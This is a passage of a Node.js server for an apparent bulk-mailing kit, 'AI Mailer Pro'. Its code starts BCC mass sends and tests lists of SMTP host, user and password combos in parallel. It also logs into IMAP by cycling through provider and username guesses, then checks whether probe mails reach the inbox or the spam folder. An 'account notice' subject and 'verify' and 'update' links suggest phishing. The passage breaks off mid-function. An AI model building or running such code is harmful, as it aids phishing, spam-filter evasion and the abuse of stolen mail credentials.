        fs.writeFileSync(path.join(__dirname, 'langs', lang, 'links.txt'), 'https://example.com\nhttps://update.com\nhttps://verify.com');
      });
      
      // Generate sample templates
      languages.forEach(lang => {
        const template = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Email Template</title>
</head>
<body>
    <h1>Hello {email}</h1>
    <p>This is a sample email template for ${lang} language.</p>
    <p>Please click the link: {link}</p>
    <p>Best regards,<br>AI Mailer Team</p>
</body>
</html>`;
        fs.writeFileSync(path.join(__dirname, 'letters', lang, 'template1.html'), template);
      });
      
      // Generate sample footers
      languages.forEach(lang => {
        const footer = `<div style="text-align: center; padding: 20px; background-color: #f5f5f5;">
    <p>© 2024 AI Mailer - ${lang} Version</p>
    <p><a href="{link}">Unsubscribe</a> | <a href="{link}">Privacy Policy</a></p>
</div>`;
        fs.writeFileSync(path.join(__dirname, 'footers', lang, 'footer1.html'), footer);
      });
      
      // Generate sample SMTP and emails if not exists
      if (!fs.existsSync(path.join(__dirname, 'smtp.txt')) || !fs.readFileSync(path.join(__dirname, 'smtp.txt'), 'utf8').trim()) {
        const sampleSmtp = `smtp.gmail.com|587|your-email@gmail.com|your-password
smtp.outlook.com|587|your-email@outlook.com|your-password`;
        fs.writeFileSync(path.join(__dirname, 'smtp.txt'), sampleSmtp);
      }
      
      if (!fs.existsSync(path.join(__dirname, 'emails.txt')) || !fs.readFileSync(path.join(__dirname, 'emails.txt'), 'utf8').trim()) {
        const sampleEmails = `test@example.com\nsample@domain.com\ndemo@test.com\nuser@website.com`;
        fs.writeFileSync(path.join(__dirname, 'emails.txt'), sampleEmails);
      }
      
      res.json({ success: true, message: 'All sample data generated successfully' });
    }
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Enhanced start mailer with validation
app.post('/api/start', (req, res) => {
  try {
    if (isRunning) {
      return res.status(400).json({ error: 'Mailer is already running' });
    }
    
    // Validate prerequisites first
    const errors = validateMailerPrerequisites();
    if (errors.length > 0) {
      return res.status(400).json({ 
        error: 'Cannot start mailer due to missing prerequisites',
        details: errors,
        suggestion: 'Use the Setup Wizard to generate required data files'
      });
    }
    
    const { 
      dryRun = false, 
      testEmail = '', 
      testPassword = '', 
      smartInboxGuard = false, 
      testInterval = 20 
    } = req.body;

    // Persist testEmail settings into config.json if provided
    try {
      const configPath = path.join(__dirname, 'config.json');
      if (fs.existsSync(configPath)) {
        const curCfg = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        if (testEmail) {
          curCfg.testEmail = {
            email: String(testEmail).trim(),
            password: testPassword ? String(testPassword).trim() : (curCfg.testEmail?.password || ''),
            interval: parseInt(testInterval, 10) || 20,
            smartInboxFilter: Boolean(smartInboxGuard || testPassword)
          };
          fs.writeFileSync(configPath, JSON.stringify(curCfg, null, 2));
        }
      }
    } catch (e) {
      console.warn('Could not sync testEmail to config.json:', e.message);
    }
    
    // Reset progress with accurate email total
    const totalEmails = getInitialTotalEmails();
    currentProgress = { sent: 0, total: totalEmails, failed: 0 };
    broadcast({
      type: 'progress',
      data: currentProgress
    });
    
    // Start the mailer process
    const args = ['src/index.js', '--no-interactive'];
    if (dryRun) {
      args.push('--dry-run');
    }
    if (testEmail && String(testEmail).trim()) {
      args.push('--test-email', String(testEmail).trim());
    }
    if (testPassword && String(testPassword).trim()) {
      args.push('--test-password', String(testPassword).trim());
    }
    if (testInterval) {
      args.push('--test-interval', String(testInterval));
    }
    if (smartInboxGuard || (testPassword && String(testPassword).trim())) {
      args.push('--smart-inbox-guard');
    }
    
    mailerProcess = spawn('node', args, {
      cwd: __dirname,
      stdio: ['pipe', 'pipe', 'pipe']
    });
    
    isRunning = true;
    
    // Handle process output
    mailerProcess.stdout.on('data', (data) => {
      const output = data.toString();
      console.log('Mailer output:', output);
      
      const lines = output.split('\n');
      let progressUpdated = false;

      for (const rawLine of lines) {
        const line = rawLine.trim();
        if (!line) continue;

        // Structured Smart Inbox Guard event markers
        const spamAlertMatch = line.match(/\[SPAM_ALERT:(\{.*?\})\]/);
        if (spamAlertMatch) {
          try {
            const alertData = JSON.parse(spamAlertMatch[1]);
            broadcast({
              type: 'spam-alert',
              data: alertData
            });
          } catch (e) {}
          continue;
        }

        const inboxHitMatch = line.match(/\[INBOX_HIT:(\{.*?\})\]/);
        if (inboxHitMatch) {
          try {
            const hitData = JSON.parse(inboxHitMatch[1]);
            broadcast({
              type: 'inbox-hit',
              data: hitData
            });
          } catch (e) {}
          continue;
        }

        const spamDropMatch = line.match(/\[SPAM_DROP:(\{.*?\})\]/);
        if (spamDropMatch) {
          try {
            const dropData = JSON.parse(spamDropMatch[1]);
            broadcast({
              type: 'spam-drop',
              data: dropData
            });
          } catch (e) {}
          continue;
        }

        // 1. Structured JSON progress marker
        const progMatch = line.match(/\[PROGRESS:(\{.*?\})\]/);
        if (progMatch) {
          try {
            const p = JSON.parse(progMatch[1]);
            if (p.sent !== undefined) currentProgress.sent = Number(p.sent);
            if (p.failed !== undefined) currentProgress.failed = Number(p.failed);
            if (p.total !== undefined && Number(p.total) > 0) currentProgress.total = Number(p.total);
            progressUpdated = true;
          } catch (e) {}
          continue;
        }

        // 2. BCC mode batch sent log
        const bccSentMatch = line.match(/\[BCC Batch \d+\/\d+\] Sent (\d+) emails/i);
        if (bccSentMatch) {
          currentProgress.sent += parseInt(bccSentMatch[1], 10);
          progressUpdated = true;
          continue;
        }

        // 3. BCC mode dry-run log
        const bccDryMatch = line.match(/DRY RUN: Would send BCC batch \d+\/\d+.*?\[(?:Milestone \d+:\s*)?(\d+)\s+targets/i);
        if (bccDryMatch) {
          currentProgress.sent += parseInt(bccDryMatch[1], 10);
          progressUpdated = true;
          continue;
        }

        // 4. Individual mode sent log
        if (line.includes('Email sent successfully')) {
          currentProgress.sent++;
          progressUpdated = true;
          continue;
        }

        // 5. Individual mode dry run log
        if (line.includes('DRY RUN: Would send email')) {
          currentProgress.sent++;
          progressUpdated = true;
          continue;
        }

        // 6. Failed email logs
        if (line.includes('Failed to send email')) {
          currentProgress.failed++;
          progressUpdated = true;
        } else if (line.match(/\[BCC Batch \d+\/\d+\] Failed to send/i)) {
          // Estimate failed batch size if bulkCount is available
          const countMatch = line.match(/"recipientsCount":\s*(\d+)/);
          currentProgress.failed += countMatch ? parseInt(countMatch[1], 10) : 10;
          progressUpdated = true;
        }
      }
      
      // Clean internal markers from user-facing logs
      const cleanedLog = output.replace(/\[(?:PROGRESS|SPAM_ALERT|INBOX_HIT|SPAM_DROP):\{.*?\}\]\r?\n?/g, '');
      if (cleanedLog.trim()) {
        broadcast({
          type: 'log',
          data: cleanedLog
        });
      }
      
      if (progressUpdated) {
        broadcast({
          type: 'progress',
          data: currentProgress
        });
      }
    });
    
    mailerProcess.stderr.on('data', (data) => {
      const error = data.toString();
      console.error('Mailer error:', error);
      
      broadcast({
        type: 'error',
        data: error
      });
    });
    
    mailerProcess.on('close', (code) => {
      console.log(`Mailer process exited with code ${code}`);
      isRunning = false;
      mailerProcess = null;

      // On clean exit, ensure sent count reaches total if all finished
      if (code === 0 && currentProgress.total > 0 && (currentProgress.sent + currentProgress.failed < currentProgress.total)) {
        currentProgress.sent = currentProgress.total - currentProgress.failed;
        broadcast({
          type: 'progress',
          data: currentProgress
        });
      }
      
      broadcast({
        type: 'status',
        data: { running: false, code }
      });
    });
    
    res.json({ success: true, dryRun });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Stop mailer
app.post('/api/stop', (req, res) => {
  try {
    if (!isRunning || !mailerProcess) {
      return res.status(400).json({ error: 'Mailer is not running' });
    }
    
    mailerProcess.kill('SIGTERM');
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get status
app.get('/api/status', (req, res) => {
  res.json({
    running: isRunning,
    progress: currentProgress
  });
});

// Get logs (disk logs disabled to save storage)
app.get('/api/logs', (req, res) => {
  res.json([]);
});

// BCC management endpoints
app.get('/api/bcc/emails', (req, res) => {
  try {
    const bccManager = require('./bcc-manager');
    const emails = bccManager.loadEmails();
    res.json(emails);
  } catch (error) {
    console.error('Error loading BCC emails:', error);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/bcc/emails', (req, res) => {
  try {
    const bccManager = require('./bcc-manager');
    const { emails, action } = req.body;
    
    if (!action) {
      return res.status(400).json({ error: 'Action is required' });
    }
    
    if (!['add', 'remove', 'clear'].includes(action)) {
      return res.status(400).json({ error: 'Invalid action. Must be add, remove, or clear' });
    }
    
    switch (action) {
      case 'add':
        if (!emails || !Array.isArray(emails)) {
          return res.status(400).json({ error: 'Emails array is required for add action' });
        }
        bccManager.addEmails(emails);
        break;
      case 'remove':
        if (!emails || !Array.isArray(emails)) {
          return res.status(400).json({ error: 'Emails array is required for remove action' });
        }
        bccManager.removeEmails(emails);
        break;
      case 'clear':
        bccManager.clearEmails();
        break;
    }
    
    res.json({ success: true, message: `BCC emails ${action}ed successfully` });
  } catch (error) {
    console.error('Error managing BCC emails:', error);
    res.status(500).json({ error: error.message });
  }
});

// ==========================================================================
// SMTP INBOX TESTER & DELIVERABILITY AI ENGINE
// ==========================================================================

let checkerActive = false;
let checkerAbort = false;
let checkerWorkingSmtps = [];
let checkerBackgroundImapQueue = [];
let checkerBackgroundImapRunning = false;
let checkerStats = {
  total: 0,
  tested: 0,
  inbox: 0,
  spam: 0,
  failed: 0,
  relay: 0
};

/**
 * Robust TLS IMAP Session Handler with RFC 3501 Tagged Commands
 */
class ImapSession {
  constructor(host, port) {
    this.host = host;
    this.port = port || 993;
    this.socket = null;
    this.cmdCount = 0;
  }

  connect(timeoutMs = 6000) {
    return new Promise((resolve, reject) => {
      let buffer = '';
      const timer = setTimeout(() => {
        this.close();
        reject(new Error(`IMAP connection timed out to ${this.host}:${this.port}`));
      }, timeoutMs);

      try {
        this.socket = tls.connect({ host: this.host, port: this.port, rejectUnauthorized: false }, () => {});
      } catch (err) {
        clearTimeout(timer);
        return reject(err);
      }

      this.socket.setEncoding('utf8');

      const onGreeting = (chunk) => {
        buffer += chunk;
        if (buffer.includes('* OK')) {
          clearTimeout(timer);
          this.socket.removeListener('data', onGreeting);
          resolve();
        }
      };

      this.socket.on('data', onGreeting);
      this.socket.once('error', (err) => {
        clearTimeout(timer);
        this.close();
        reject(err);
      });
    });
  }

  exec(command, timeoutMs = 7000) {
    return new Promise((resolve, reject) => {
      if (!this.socket || this.socket.destroyed) {
        return reject(new Error('IMAP socket disconnected'));
      }
      this.cmdCount++;
      const tag = `T${String(this.cmdCount).padStart(3, '0')}`;
      let cmdBuffer = '';

      const timer = setTimeout(() => {
        cleanup();
        reject(new Error(`IMAP command "${command.split(' ')[0]}" timed out`));
      }, timeoutMs);

      const onData = (chunk) => {
        cmdBuffer += chunk;
        if (cmdBuffer.includes(`${tag} OK`)) {
          cleanup();
          resolve({ ok: true, data: cmdBuffer });
        } else if (cmdBuffer.includes(`${tag} NO`) || cmdBuffer.includes(`${tag} BAD`)) {
          cleanup();
          resolve({ ok: false, data: cmdBuffer });
        }
      };

      const onError = (err) => {
        cleanup();
        reject(err);
      };

      const cleanup = () => {
        clearTimeout(timer);
        if (this.socket) {
          this.socket.removeListener('data', onData);
          this.socket.removeListener('error', onError);
        }
      };

      this.socket.on('data', onData);
      this.socket.once('error', onError);
      this.socket.write(`${tag} ${command}\r\n`);
    });
  }

  close() {
    if (this.socket) {
      try {
        this.socket.write('T999 LOGOUT\r\n');
        this.socket.removeAllListeners();
        this.socket.destroy();
      } catch (e) {}
      this.socket = null;
    }
  }
}

// In-memory cache for discovered domain IMAP endpoints to accelerate multi-account processing
const domainImapDiscoveryCache = new Map();

/**
 * Smart IMAP Auto-Discovery: tries every domain pattern & username combination with domain-level caching
 */
async function autoDiscoverImap(email, password) {
  if (!email || !password) return null;
  const parts = email.split('@');
  if (parts.length < 2) return null;

  const domain = parts[1].toLowerCase().trim();
  const userPrefix = parts[0].trim();

  // Fast-path: Check domain discovery cache first
  const cached = domainImapDiscoveryCache.get(domain);
  if (cached) {
    const candidateUser = cached.userPrefixOnly ? userPrefix : email;
    const session = new ImapSession(cached.host, cached.port);
    try {
      await session.connect(2500);
      const safeUser = candidateUser.replace(/["\\]/g, '\\$&');
      const safePass = password.replace(/["\\]/g, '\\$&');
      const res = await session.exec(`LOGIN "${safeUser}" "${safePass}"`, 3500);
      session.close();
      if (res.ok) {
        return {
          host: cached.host,
          port: cached.port,
          user: candidateUser,
          pass: password
        };
      }
    } catch (e) {
      session.close();
    }
  }

  // Known candidate servers
  const providerMap = {
    't-online.de': [
      { host: 'secureimap.t-online.de', port: 993 },
      { host: 'imap.t-online.de', port: 993 }
    ],
    'web.de': [
      { host: 'imap.web.de', port: 993 }
    ],
    'gmx.net': [
      { host: 'imap.gmx.net', port: 993 }
    ],
    'gmx.de': [
      { host: 'imap.gmx.net', port: 993 }
    ],
    'gmail.com': [
      { host: 'imap.gmail.com', port: 993 }
    ],
    'googlemail.com': [
      { host: 'imap.gmail.com', port: 993 }
    ],
    'outlook.com': [
      { host: 'outlook.office365.com', port: 993 },
      { host: 'imap-mail.outlook.com', port: 993 }
    ],
    'hotmail.com': [
      { host: 'outlook.office365.com', port: 993 },
      { host: 'imap-mail.outlook.com', port: 993 }
    ],
    'live.com': [
      { host: 'outlook.office365.com', port: 993 }
    ],
    'office365.com': [
      { host: 'outlook.office365.com', port: 993 }
    ],
    'yahoo.com': [
      { host: 'imap.mail.yahoo.com', port: 993 }
    ],
    'yahoo.de': [
      { host: 'imap.mail.yahoo.com', port: 993 }
    ],
    'freenet.de': [
      { host: 'mx.freenet.de', port: 993 }
    ],
    'icloud.com': [
      { host: 'imap.mail.me.com', port: 993 }
    ],
    'mail.ru': [
      { host: 'imap.mail.ru', port: 993 }
    ],
    'yandex.com': [
      { host: 'imap.yandex.com', port: 993 }
    ],
    'yandex.ru': [
      { host: 'imap.yandex.ru', port: 993 }
    ]
  };

  let candidateHosts = [];
  if (providerMap[domain]) {
    candidateHosts = [...providerMap[domain]];
  } else {
    candidateHosts = [
      { host: `imap.${domain}`, port: 993 },
      { host: `mail.${domain}`, port: 993 },
      { host: domain, port: 993 }
    ];
  }

  const candidateUsers = [email];
  if (userPrefix !== email) {
    candidateUsers.push(userPrefix);
  }

  // Try combinations fast
  for (const target of candidateHosts) {
    for (const u of candidateUsers) {
      const session = new ImapSession(target.host, target.port);
      try {
        console.log(`[Smart IMAP] Probing ${target.host}:${target.port} with ${u}...`);
        await session.connect(2500);
        const safeUser = u.replace(/["\\]/g, '\\$&');
        const safePass = password.replace(/["\\]/g, '\\$&');
        const res = await session.exec(`LOGIN "${safeUser}" "${safePass}"`, 3500);
        session.close();
        if (res.ok) {
          console.log(`[Smart IMAP] Connected successfully to ${target.host}:${target.port} as ${u}`);
          // Cache successful domain endpoint
          domainImapDiscoveryCache.set(domain, {
            host: target.host,
            port: target.port,
            userPrefixOnly: u === userPrefix && userPrefix !== email
          });
          return {
            host: target.host,
            port: target.port,
            user: u,
            pass: password
          };
        }
      } catch (err) {
        session.close();
      }
    }
  }

  console.log(`[Smart IMAP] No matching IMAP login succeeded for ${email}. Falling back to 250 OK delivery mode.`);
  return null;
}

/**
 * Checks if a message from senderEmail actually exists in INBOX or SPAM folders.
 * Zero false positives: if the message has not arrived in mailbox, returns 'not_arrived'.
 * Never lies or defaults to inbox on failure!
 */
async function checkImapPlacement(imapConfig, senderEmail, subjectText, sendTime, maxWaitMs = 25000, onLog = null, probeToken = null) {
  const session = new ImapSession(imapConfig.host, imapConfig.port);
  try {
    if (onLog) onLog(`[IMAP Placement] Connecting to ${imapConfig.host}:${imapConfig.port}...`);
    await session.connect(5000);

    const safeUser = imapConfig.user.replace(/["\\]/g, '\\$&');
    const safePass = imapConfig.pass.replace(/["\\]/g, '\\$&');
    const loginRes = await session.exec(`LOGIN "${safeUser}" "${safePass}"`, 6000);
    if (!loginRes.ok) {
      session.close();
      return { landed: 'auth_failed', folder: 'IMAP AUTH FAILED', error: 'Target IMAP login refused: invalid password' };
    }

    // Discover mailboxes (LIST "" "*")
    const listRes = await session.exec('LIST "" "*"', 5000);
    let spamFolders = [];
    if (listRes.ok) {
      const lines = listRes.data.split('\r\n');
      for (const line of lines) {
        const match = line.match(/\* LIST \([^)]*\) "(?:[^"\\]|\\.)*" "([^"]+)"/i) || line.match(/\* LIST \([^)]*\) "(?:[^"\\]|\\.)*" (.+)$/i);
        if (match) {
          const fName = match[1].trim();
          if (/spam|junk|bulk|quarantine|verdacht/i.test(fName) && !spamFolders.includes(fName)) {
            spamFolders.push(fName);
          }
        }
      }
    }
    if (spamFolders.length === 0) {
      spamFolders = ['Spam', 'Junk', 'INBOX.Spam', 'INBOX.Junk', 'Spamverdacht'];
    }

    const cleanSender = senderEmail.replace(/["\\]/g, '').trim();
    const tokenMatch = subjectText ? subjectText.match(/\[([A-Za-z0-9\-_ ]+)\]/) : null;
    const token = tokenMatch ? tokenMatch[1].trim() : '';
    const subjectWords = subjectText
      ? subjectText.replace(/\[.*?\]/g, '').replace(/[^a-zA-Z0-9\u00C0-\u017F\s]/g, '').trim().split(/\s+/).filter(w => w.length >= 4)
      : [];
    const primarySubjectWord = subjectWords.length > 0 ? subjectWords[0] : '';

    const startTime = Date.now();
    let pollCount = 0;

    // Helper to decode RFC-2047 encoded headers (Base64 and Quoted-Printable)
    const decodeRfc2047 = (str) => {
      if (!str) return '';
      return str.replace(/=\?([^?]+)\?([BQbq])\?([^?]+)\?=/g, (match, charset, encoding, text) => {
        try {
          if (encoding.toUpperCase() === 'B') {
            return Buffer.from(text, 'base64').toString('utf8');
          } else if (encoding.toUpperCase() === 'Q') {
            return text.replace(/_/g, ' ').replace(/=([A-Fa-f0-9]{2})/g, (m, hex) => String.fromCharCode(parseInt(hex, 16)));
          }
        } catch (_) {}
        return match;
      });
    };

    // Helper to search folder with multiple strategies and strictly verify unique probe token
    const findMatchingMessageId = async (folderName) => {
      const candidateIds = new Set();
      const subjectMatchedIds = new Set();

      // Strategy 1: Search for unique probeToken if provided
      if (probeToken) {
        try {
          const sRes = await session.exec(`SEARCH SUBJECT "${probeToken}"`, 4000);
          if (sRes.ok) {
            const m = sRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
            if (m && m[1]) {
              m[1].trim().split(/\s+/).map(Number).filter(n => !isNaN(n)).forEach(id => {
                candidateIds.add(id);
                subjectMatchedIds.add(id);
              });
            }
          }
        } catch (e) {}

        try {
          const tRes = await session.exec(`SEARCH TEXT "${probeToken}"`, 4000);
          if (tRes.ok) {
            const m = tRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
            if (m && m[1]) {
              m[1].trim().split(/\s+/).map(Number).filter(n => !isNaN(n)).forEach(id => candidateIds.add(id));
            }
          }
        } catch (e) {}

        try {
          const hRes = await session.exec(`SEARCH HEADER "X-Smart-Probe-Token" "${probeToken}"`, 4000);
          if (hRes.ok) {
            const m = hRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
            if (m && m[1]) {
              m[1].trim().split(/\s+/).map(Number).filter(n => !isNaN(n)).forEach(id => candidateIds.add(id));
            }
          }
        } catch (e) {}
      }

      // Strategy 2: SEARCH FROM sender
      try {
        const fromRes = await session.exec(`SEARCH FROM "${cleanSender}"`, 4000);
        if (fromRes.ok) {
          const m = fromRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
          if (m && m[1]) {
            m[1].trim().split(/\s+/).map(Number).filter(n => !isNaN(n)).forEach(id => candidateIds.add(id));
          }
        }
      } catch (e) {}

      // Strategy 3: SEARCH UNSEEN as backup
      try {
        const unseenRes = await session.exec('SEARCH UNSEEN', 4000);
        if (unseenRes.ok) {
          const m = unseenRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
          if (m && m[1]) {
            m[1].trim().split(/\s+/).map(Number).filter(n => !isNaN(n)).forEach(id => candidateIds.add(id));
          }
        }
      } catch (e) {}

      if (candidateIds.size === 0) return null;

      // Sort candidate IDs descending (newest first)
      const sortedIds = Array.from(candidateIds).sort((a, b) => b - a);

      // Inspect up to 10 latest messages
      for (const id of sortedIds.slice(0, 10)) {
        try {
          // If server search already matched the exact subject probeToken, verified!
          if (probeToken && subjectMatchedIds.has(id)) {
            if (onLog) onLog(`[IMAP Placement] 🎯 Verified UNIQUE probe token match (${probeToken}) in message ID ${id} inside ${folderName}!`);
            return id;
          }

          const fRes = await session.exec(`FETCH ${id} (INTERNALDATE BODY.PEEK[HEADER.FIELDS (X-Smart-Probe-Token X-Delivery-Probe-ID SUBJECT FROM)] BODY.PEEK[TEXT]<0.8192>)`, 4000);
          if (fRes.ok) {
            const rawData = fRes.data;
            const decodedRaw = decodeRfc2047(rawData);

            // If probeToken is specified, message MUST contain the unique probe token!
            if (probeToken) {
              if (decodedRaw.includes(probeToken) || rawData.includes(probeToken)) {
                if (onLog) onLog(`[IMAP Placement] 🎯 Verified UNIQUE probe token match (${probeToken}) in message ID ${id} inside ${folderName}!`);
                return id;
              }
              // Skip old or non-matching messages from this sender
              continue;
            }

            // Fallback if no probeToken was given: enforce strict recent timestamp check (within 10s of send)
            let isRecent = true;
            const dateMatch = rawData.match(/INTERNALDATE "([^"]+)"/i);
            if (dateMatch && dateMatch[1]) {
              const msgDate = new Date(dateMatch[1]).getTime();
              if (!isNaN(msgDate) && msgDate < (sendTime - 10000)) {
                isRecent = false;
              }
            }
            if (isRecent) {
              return id;
            }
          }
        } catch (e) {}
      }

      return null;
    };

    // Iteratively scan INBOX & Spam to allow for MX delivery delay (usually 3-15s)
    while (Date.now() - startTime < maxWaitMs) {
      pollCount++;
      if (onLog) onLog(`[IMAP Placement] Scanning ${imapConfig.user} mailbox for sender ${cleanSender}${probeToken ? ` (Probe: ${probeToken})` : ''} (scan #${pollCount})...`);

      // 1. Check INBOX
      const selInbox = await session.exec('SELECT "INBOX"', 5000);
      if (selInbox.ok) {
        const inboxMsgId = await findMatchingMessageId('INBOX');
        if (inboxMsgId) {
          session.close();
          return { landed: 'inbox', folder: 'INBOX', messageId: inboxMsgId, probeToken };
        }
      }

      // 2. Check Spam folders
      for (const sf of spamFolders) {
        const selSpam = await session.exec(`SELECT "${sf}"`, 4000);
        if (selSpam.ok) {
          const spamMsgId = await findMatchingMessageId(sf);
          if (spamMsgId) {
            session.close();
            return { landed: 'spam', folder: sf, messageId: spamMsgId, probeToken };
          }
        }
      }

      // Wait 2.5 seconds before next poll
      if (Date.now() - startTime + 3000 < maxWaitMs) {
        await new Promise(r => setTimeout(r, 2500));
      } else {
        break;
      }
    }

    session.close();
    return {
      landed: 'not_arrived',
      folder: 'DROPPED / NOT IN BOX',
      error: `Accepted by relay, but unique message (${probeToken || cleanSender}) not detected in ${imapConfig.user} mailbox`
    };
  } catch (err) {
    session.close();
    return {
      landed: 'error',
      folder: 'IMAP CHECK FAILED',
      error: `IMAP inspection error: ${err.message}`
    };
  }
}

/**
 * Load Active Template Letter, Subject, and Sender Name from Template Studio & Config
 */
function getActiveTemplateData(preferredLang = null) {
  let senderName = 'AI Mailer Pro';
  let defaultLang = 'DE';
  let bccConfig = { enabled: false, bulkCount: 10, bccDelayMs: 12000, bccEmail: '' };
  let replyTo = '';

  try {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
      const cfg = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      if (cfg.senderName) senderName = cfg.senderName;
      if (cfg.defaultLang) defaultLang = cfg.defaultLang.toUpperCase();
      if (cfg.bcc) bccConfig = cfg.bcc;
      if (cfg.replyTo) replyTo = cfg.replyTo;
    }
  } catch (e) {}

  const activeLang = (preferredLang || defaultLang).toUpperCase();

  // Active Subject from Template Studio
  let subject = 'Wichtige Mitteilung zu Ihrem Kundenkonto';
  try {
    const subjectsPath = path.join(__dirname, 'subjects', activeLang, 'subjects.txt');
    const fallbackSubjectsPath = path.join(__dirname, 'subjects', defaultLang, 'subjects.txt');
    const sPath = fs.existsSync(subjectsPath) ? subjectsPath : (fs.existsSync(fallbackSubjectsPath) ? fallbackSubjectsPath : null);
    if (sPath) {
      const lines = fs.readFileSync(sPath, 'utf8').split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
      if (lines.length > 0) {
        subject = lines[Math.floor(Math.random() * lines.length)];
      }
    }
  } catch (e) {}

  // Active HTML Letter from Template Studio
  let html = '<h2>AI Mailer Pro Deliverability Test</h2><p>This is a live test verifying server inbox delivery, TLS encryption and SPF authentication.</p>';
  try {
    const langLetterDir = path.join(__dirname, 'letters', activeLang);
    const defLetterDir = path.join(__dirname, 'letters', defaultLang);
    let chosenLetterPath = null;

    if (fs.existsSync(langLetterDir)) {
      const htmlFiles = fs.readdirSync(langLetterDir).filter(f => f.endsWith('.html'));
      if (htmlFiles.includes('letter1.html')) {
        chosenLetterPath = path.join(langLetterDir, 'letter1.html');
      } else if (htmlFiles.length > 0) {
        chosenLetterPath = path.join(langLetterDir, htmlFiles[0]);
      }
    }
    if (!chosenLetterPath && fs.existsSync(defLetterDir)) {
      const htmlFiles = fs.readdirSync(defLetterDir).filter(f => f.endsWith('.html'));
      if (htmlFiles.length > 0) {
        chosenLetterPath = path.join(defLetterDir, htmlFiles[0]);
      }
    }
    if (!chosenLetterPath) {
      const rootLetter = path.join(__dirname, 'letter.html');
      if (fs.existsSync(rootLetter)) chosenLetterPath = rootLetter;
    }

    if (chosenLetterPath && fs.existsSync(chosenLetterPath)) {
      html = fs.readFileSync(chosenLetterPath, 'utf8');
    }
  } catch (e) {}

  // Active Headers & Footers if referenced in template
  let header = '';
  try {
    const headerDir = path.join(__dirname, 'headers', activeLang);
    if (fs.existsSync(headerDir)) {
      const files = fs.readdirSync(headerDir).filter(f => f.endsWith('.html') || f.endsWith('.txt'));
      if (files.length > 0) header = fs.readFileSync(path.join(headerDir, files[0]), 'utf8');
    }
  } catch (e) {}

  let footer = '';
  try {
    const footerDir = path.join(__dirname, 'footers', activeLang);
    if (fs.existsSync(footerDir)) {
      const files = fs.readdirSync(footerDir).filter(f => f.endsWith('.html') || f.endsWith('.txt'));
      if (files.length > 0) footer = fs.readFileSync(path.join(footerDir, files[0]), 'utf8');
    }
  } catch (e) {}

  // Active Links - directly check language folders and root dynamically
  let links = [];
  try {
    const searchPaths = [
      path.join(__dirname, 'langs', activeLang, 'links.txt'),
      path.join(__dirname, 'langs', defaultLang, 'links.txt'),
      path.join(__dirname, 'langs', 'DE', 'links.txt'),
      path.join(__dirname, 'langs', 'de', 'links.txt'),
      path.join(__dirname, 'links.txt')
    ];
    for (const p of searchPaths) {
      if (fs.existsSync(p)) {
        const loaded = fs.readFileSync(p, 'utf8')
          .split('\n')
          .map(l => l.trim().replace(/\r/g, ''))
          .filter(l => l && !l.startsWith('#') && !l.startsWith('//'));
        if (loaded.length > 0) {
          links = loaded;
          break;
        }
      }
    }
  } catch (e) {}

  const link = (links.length > 0) ? links[Math.floor(Math.random() * links.length)] : utils.resolveSmartLink({ lang: activeLang });

  return {
    senderName,
    defaultLang: activeLang,
    subject,
    html,
    header,
    footer,
    bccConfig,
    replyTo,
    links,
    link
  };
}

let checkerPendingProbes = [];

// Start Multi-Threaded SMTP Inbox Verification with Smart IMAP Placement Monitor
app.post('/api/smtp-checker/start', async (req, res) => {
  try {
    if (checkerActive) {
      return res.status(400).json({ error: 'SMTP checker is already running' });
    }

    const {
      smtpList,
      targetEmail,
      targetPassword,
      concurrency = 10,
      timeout = 8000,
      templateLang
    } = req.body;

    if (!Array.isArray(smtpList) || smtpList.length === 0) {
      return res.status(400).json({ error: 'Valid smtpList array is required' });
    }

    if (!targetEmail || !targetEmail.includes('@')) {
      return res.status(400).json({ error: 'Valid targetEmail is required' });
    }

    const parsedCombos = [];
    for (const line of smtpList) {
      const clean = (line || '').trim();
      if (!clean || clean.startsWith('#')) continue;
      const parts = clean.includes('|') ? clean.split('|') : clean.split(':');
      if (parts.length >= 4) {
        parsedCombos.push({
          host: parts[0].trim(),
          port: parseInt(parts[1].trim(), 10) || 587,
          user: parts[2].trim(),
          pass: parts[3].trim()
        });
      }
    }

    if (parsedCombos.length === 0) {
      return res.status(400).json({ error: 'No valid host|port|user|pass credentials detected in input' });
    }

    const parsedConcur = Math.max(1, Math.min(parseInt(concurrency, 10) || 10, 50));
    const probeTimeout = Math.max(2000, Math.min(parseInt(timeout, 10) || 8000, 30000));

    // Load active Template Studio content & delivery mode
    const templateData = getActiveTemplateData(templateLang);
    const isBccMode = !!(templateData.bccConfig && templateData.bccConfig.enabled);

    checkerActive = true;
    checkerAbort = false;
    checkerWorkingSmtps = [];
    checkerPendingProbes = [];
    checkerStats = {
      total: parsedCombos.length,
      tested: 0,
      inbox: 0,
      spam: 0,
      failed: 0,
      relay: 0
    };

    // Respond immediately to unblock client UI
    res.json({
      success: true,
      total: parsedCombos.length,
      concurrency: parsedConcur,
      targetEmail,
      mode: isBccMode ? 'bcc' : 'single',
      templateLang: templateData.defaultLang,
      senderName: templateData.senderName
    });

    // Run async multi-threaded checking engine
    (async () => {
      broadcast({
        type: 'log',
        data: `[SMTP Verifier] 🚀 Launching multi-threaded tester: ${parsedCombos.length} nodes across ${parsedConcur} parallel workers to ${targetEmail} [Mode: ${isBccMode ? 'BCC' : 'Normal Single'}]...`
      });

      // Resolve IMAP once if password provided
      let imapConfig = null;
      if (targetPassword && targetPassword.trim()) {
        broadcast({
          type: 'log',
          data: `[Deliverability AI] Auto-resolving IMAP mailbox settings for ${targetEmail}...`
        });
        imapConfig = await autoDiscoverImap(targetEmail, targetPassword.trim());
        if (imapConfig) {
          broadcast({
            type: 'log',
            data: `[Deliverability AI] ✅ IMAP connected to ${imapConfig.host}:${imapConfig.port}! Real-time Folder Placement & Probe tracking active.`
          });
